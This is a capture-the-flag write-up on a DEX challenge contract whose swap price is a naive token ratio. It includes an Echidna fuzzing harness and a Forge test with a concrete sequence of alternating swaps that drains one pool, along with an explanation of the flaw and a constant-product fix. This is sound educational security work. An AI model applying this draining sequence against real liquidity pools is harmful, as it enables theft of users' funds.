# DEX Capture the Ether

My approach here was to first find the exploit call sequence using Echidna, then take that call sequence over to a Forge/Foundry version of the project and verify that I can replicate it there, and also inspect the contract state to understand why the exploit works.

The attack basically consists of "swinging" the liquidity of the pools back and forth. We swap token A for B, then B for A, then A for B, back and forth with progressively larger amounts until we've drained all the tokens from one of the pools.

The flaw in the DEX is in using the price (the ratio between the tokens) to determine how much of the output token the swapper should receive. The `getSwapPrice` function calculates the `swapAmount` for the `swap` function by simply multiplying the input amount by the ratio of the two tokens.

As the token pools become unbalanced this model starts to "bleed" tokens. The DEX should be re-architected to use a constant product model like Uniswap. In a constant product model liquidity is provided along a curve which does not bleed tokens.

```js
function getSwapPrice(address from, address to, uint256 amount) public view returns (uint256) {
    return ((amount * IERC20(to).balanceOf(address(this))) / IERC20(from).balanceOf(address(this)));
}
```

## Echidna

```js
function swap(address from, address to, uint256 amount, uint256 approveAmount) public {
    // pre-conditions
    // only two addresses are valid, and amount should be <= balance
    if (from < to) {
        from = tokenAAddress;
        to = tokenBAddress;
        amount = amount % tokenA.balanceOf(address(this)) + 1;
    } else {
        to = tokenAAddress;
        from = tokenBAddress;
        amount = amount % tokenB.balanceOf(address(this)) + 1;
    }
    if (approveAmount < amount) {
        // if approve amount less than amount, swap them
        uint256 temp;
        temp = approveAmount;
        approveAmount = amount;
        amount = temp;
    }

    // record state snapshots for echidna
    State memory state = State(from, to, amount);
    states.push(state);
    for (uint256 i = 0; i < states.length; i++) {
        emit Log(states[i].from, states[i].to, states[i].amount);
    }

    // action
    dexContract.approve(dexAddress, approveAmount);
    dexContract.swap(from, to, amount);

    // post-condition
    assert(tokenA.balanceOf(address(this)) < 100 && tokenB.balanceOf(address(this)) < 100);
}
```

## Forge

```js
function testAttack() public {
    vm.startPrank(alice);
    dexContract.approve(dexAddress, 1e18);

    dexContract.swap(A, B, 10);
    dexContract.swap(B, A, 18);

    dexContract.swap(A, B, 22);
    dexContract.swap(B, A, 24);

    dexContract.swap(A, B, 20);
    dexContract.swap(B, A, 20);

    dexContract.swap(A, B, 34);
    dexContract.swap(B, A, 54);

    assert(tokenA.balanceOf(alice) > 100);
}
```
